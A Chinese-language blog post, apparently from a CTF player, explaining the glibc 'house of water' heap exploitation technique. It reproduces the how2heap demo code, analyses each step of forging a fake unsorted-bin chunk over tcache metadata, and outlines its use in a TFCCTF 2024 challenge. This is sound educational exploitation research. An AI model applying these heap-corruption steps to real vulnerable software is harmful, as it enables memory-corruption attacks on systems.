@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="sheratan" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      house of water 
+      
+      
+      |
+    
+     让我过六级
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">sheratan</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">house of water</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2024-09-08 20:41:05
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="house-of-water"><a href="#house-of-water" class="headerlink" title="house of water"></a>house of water</h1><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><h3 id="利用要求"><a href="#利用要求" class="headerlink" title="利用要求"></a>利用要求</h3><ol>
+<li>需要有UAF</li>
+<li>能够申请足够大内存的堆块</li>
+</ol>
+<h3 id="攻击结果"><a href="#攻击结果" class="headerlink" title="攻击结果"></a>攻击结果</h3><ul>
+<li>可以在tcache_perthread_struct上留下libc地址，使得在无法泄露libc的情况下能够完成对libc内容的修改，从而进一步完成攻击。</li>
+<li>后续可根据该地址申请到_IO_2_1_stdout_上方，通过修改泄露出libc</li>
+</ul>
+<h3 id="how2heap-demo"><a href="#how2heap-demo" class="headerlink" title="how2heap demo"></a>how2heap demo</h3><p><a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_water.c">https://github.com/shellphish/how2heap/blob/master/glibc_2.39/house_of_water.c</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">	<span class="type">void</span> *_ = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *fake_size_lsb = <span class="built_in">malloc</span>(<span class="number">0x3d8</span>);</span><br><span class="line">	<span class="type">void</span> *fake_size_msb = <span class="built_in">malloc</span>(<span class="number">0x3e8</span>);</span><br><span class="line">	<span class="built_in">free</span>(fake_size_lsb);</span><br><span class="line">	<span class="built_in">free</span>(fake_size_msb);</span><br><span class="line">	</span><br><span class="line">	<span class="type">void</span> *metadata = (<span class="type">void</span> *)((<span class="type">long</span>)(fake_size_lsb) &amp; ~(<span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *x[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">		x[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="type">void</span> *unsorted_start = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *unsorted_middle = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">void</span> *unsorted_end = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line">	</span><br><span class="line">	_ = <span class="built_in">malloc</span>(<span class="number">0xf000</span>);		  <span class="comment">// Padding</span></span><br><span class="line">	<span class="type">void</span> *end_of_fake = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Metadata chunk</span></span><br><span class="line"></span><br><span class="line">	*(<span class="type">long</span> *)end_of_fake = <span class="number">0x10000</span>;</span><br><span class="line">	*(<span class="type">long</span> *)(end_of_fake+<span class="number">0x8</span>) = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">free</span>(x[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x18</span>) = <span class="number">0x31</span>; </span><br><span class="line">	<span class="built_in">free</span>(unsorted_start<span class="number">-0x10</span>); <span class="comment">// Create a fake FWD</span></span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x18</span>) = <span class="number">0x21</span>; </span><br><span class="line">	<span class="built_in">free</span>(unsorted_end<span class="number">-0x10</span>); <span class="comment">// Create a fake BCK</span></span><br><span class="line">	*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line">	<span class="built_in">free</span>(unsorted_end);</span><br><span class="line">	<span class="built_in">free</span>(unsorted_middle);</span><br><span class="line">	<span class="built_in">free</span>(unsorted_start);</span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span> *)unsorted_start = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line">	*(<span class="type">unsigned</span> <span class="type">long</span> *)(unsorted_end+<span class="number">0x8</span>) = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line">	<span class="comment">// Next allocation *could* be our faked chunk!</span></span><br><span class="line">	<span class="type">void</span> *meta_chunk = <span class="built_in">malloc</span>(<span class="number">0x288</span>);</span><br><span class="line">	assert(meta_chunk == (metadata+<span class="number">0x90</span>)); </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>我们都知道，在glibc2.26后引入了tcache机制，在之后的版本中会先在heap的中生成一块空间作为perthread结构体，在glibc&gt;&#x3D;2.31情况下该空间大小为0x290。而tcache的管理机制会将tcache chunk的数量和首指针写入该结构体中，house of water就是利用该特性来完成利用的。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
+<p>glibc2.31后counts的类型由char变为了uint16_t，带来的最明显的变化就是结构体所占堆空间从0x250变为了0x290。<br>由于counts单个元素占2个字节，所以free掉size相邻的两块内存会在对应count位置1，从而会在内存中留下0x00010001即0x10001的值</p>
+<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://cdn.jsdelivr.net/gh/sheratan4/picture@main/img/202409071950883.png" alt="image-20240907195015775"></p>
+<p>那么就可以利用0x10001作为fake chunk的size字段，在该位置伪造一个chunk。这里伪造chunk的方法是将fake chunk挂在unsorted bin中，作为合法的unsorted bin能够被申请出来，那么就有几个条件需要满足：</p>
+<ol>
+<li>fake chunk的size为0x10001，所以如果要将其挂上unsorted bin就需要使prev_size为0x10000，同时下一个chunk的prev_inuse位为0</li>
+<li>既然要挂在unsorted bin上，那么fd和bk就需要符合要求。该利用手法是在不知道libc地址的情况下的，那么就只能释放三块unsorted bin，然后替换中间那个（因为中间那个的fd和bk都是堆地址，而其他两个的fd或bk都有libc地址）。</li>
+<li>通过malloc(0x3d8)和malloc(0x3e8)再free将指定位置置为0x10001，然后fd位置就是size为0x20的entries，bk位置就是size为0x30的entries</li>
+<li>总共有4个指针需要修改，第一块的fd改为fake chunk，fake chunk的fd改为第三块，fake chunk的bk改为第一块，第三块的bk改为fake chunk</li>
+<li>fake chunk的fd和bk由free tcache来完成，需要修改第一块-0x8处为0x31，第三块-0x8处为0x21，同时free 第一块（指chunk首地址作为data区，此时size为修改后的0x31），那么就将第一块写入了tcache struct的0x30处，即fake chunk的bk。同理将fake chunk的fd置为第三块。但是要注意tcache会在data区的0x08处写key，即原来的size位置，所以要恢复size。</li>
+<li>通过uaf堆风水修改第一块的fd和第三块的bk就成功将fake chunk挂到unsorted bin中了，再malloc就能申请到fake chunk中，通过一次malloc将指针移到相应位置，再申请大于0x400再free进unsorted bin，然后libc地址就会在指定size指针位置留下libc地址（此时还需要考虑count的值，然而最开始有0x3d8和0x3e8的malloc后free的chunk，将libc地址覆盖到这两个地方，刚好就能够利用）</li>
+</ol>
+<p>首先设置指定位置为0x10001</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *fake_size_lsb = <span class="built_in">malloc</span>(<span class="number">0x3d8</span>);</span><br><span class="line"><span class="type">void</span> *fake_size_msb = <span class="built_in">malloc</span>(<span class="number">0x3e8</span>);</span><br><span class="line"><span class="built_in">free</span>(fake_size_lsb);</span><br><span class="line"><span class="built_in">free</span>(fake_size_msb);</span><br></pre></td></tr></table></figure>
+<p>接着取heap base，申请填充tcache的chunk，准备三块unsorted bin</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *metadata = (<span class="type">void</span> *)((<span class="type">long</span>)(fake_size_lsb) &amp; ~(<span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *x[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">	x[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *unsorted_start = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line"><span class="type">void</span> *unsorted_middle = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br><span class="line"><span class="type">void</span> *unsorted_end = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Guard chunk</span></span><br></pre></td></tr></table></figure>
+<p>接着完成prev_size为0x10000和prev_inuse位为0的要求</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_ = <span class="built_in">malloc</span>(<span class="number">0xf000</span>);		  <span class="comment">// Padding</span></span><br><span class="line"><span class="type">void</span> *end_of_fake = <span class="built_in">malloc</span>(<span class="number">0x18</span>); <span class="comment">// Metadata chunk</span></span><br><span class="line">*(<span class="type">long</span> *)end_of_fake = <span class="number">0x10000</span>;</span><br><span class="line">*(<span class="type">long</span> *)(end_of_fake+<span class="number">0x8</span>) = <span class="number">0x20</span>;</span><br></pre></td></tr></table></figure>
+<p>然后free 7个到tcache bin，free三个到unsorted bin，同时完成修改fake chunk的fd和bk和恢复size</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">	<span class="built_in">free</span>(x[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x18</span>) = <span class="number">0x31</span>; </span><br><span class="line"><span class="built_in">free</span>(unsorted_start<span class="number">-0x10</span>); <span class="comment">// Create a fake FWD</span></span><br><span class="line">*(<span class="type">long</span>*)(unsorted_start<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line">*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x18</span>) = <span class="number">0x21</span>; </span><br><span class="line"><span class="built_in">free</span>(unsorted_end<span class="number">-0x10</span>); <span class="comment">// Create a fake BCK</span></span><br><span class="line">*(<span class="type">long</span>*)(unsorted_end<span class="number">-0x8</span>) = <span class="number">0x91</span>; </span><br><span class="line"><span class="built_in">free</span>(unsorted_end);</span><br><span class="line"><span class="built_in">free</span>(unsorted_middle);</span><br><span class="line"><span class="built_in">free</span>(unsorted_start);</span><br></pre></td></tr></table></figure>
+<p>最后，修改第一块的fd和第三块的bk为fake chunk完成利用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)unsorted_start = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line">*(<span class="type">unsigned</span> <span class="type">long</span> *)(unsorted_end+<span class="number">0x8</span>) = (<span class="type">unsigned</span> <span class="type">long</span>)(metadata+<span class="number">0x80</span>);</span><br><span class="line"><span class="comment">// Next allocation *could* be our faked chunk!</span></span><br><span class="line"><span class="type">void</span> *meta_chunk = <span class="built_in">malloc</span>(<span class="number">0x288</span>);</span><br><span class="line">assert(meta_chunk == (metadata+<span class="number">0x90</span>));</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="https://cdn.jsdelivr.net/gh/sheratan4/picture@main/img/202409072044046.png" alt="image-20240907204438810"></p>
+<p>然而在实际应用中无法泄露地址，所以也是不知道heap base的，只能通过覆盖低2字节来绕过alsr，这时就有1&#x2F;16的概率可以成功完成利用。修改体现在第一块的fd和第三块的bk。</p>
+<h2 id="TFCCTF-2024-MCGUAVA"><a href="#TFCCTF-2024-MCGUAVA" class="headerlink" title="TFCCTF 2024 MCGUAVA"></a>TFCCTF 2024 MCGUAVA</h2><p>先house of water使tcache上拿到libc地址，再覆盖低地址到stdout上方，通过修改stdout泄露libc，再house of apple即可</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/post/2bc7c011.html" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2024-09-08 20:41:05
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/post/d41a2c59.html" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#house-of-water"><span class="toc-text">house of water</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-text">原理分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%A6%81%E6%B1%82"><span class="toc-text">利用要求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E7%BB%93%E6%9E%9C"><span class="toc-text">攻击结果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#how2heap-demo"><span class="toc-text">how2heap demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TFCCTF-2024-MCGUAVA"><span class="toc-text">TFCCTF 2024 MCGUAVA</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/sheratan4">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+        <li>
+          
+            <a title="email" href="mailto:sheratan@wgpsec.org">
+              <i class="iconfont icon-envelope"></i>
+            </a>
+            
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/sheratan4">Copyright © 2024 Oranges</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
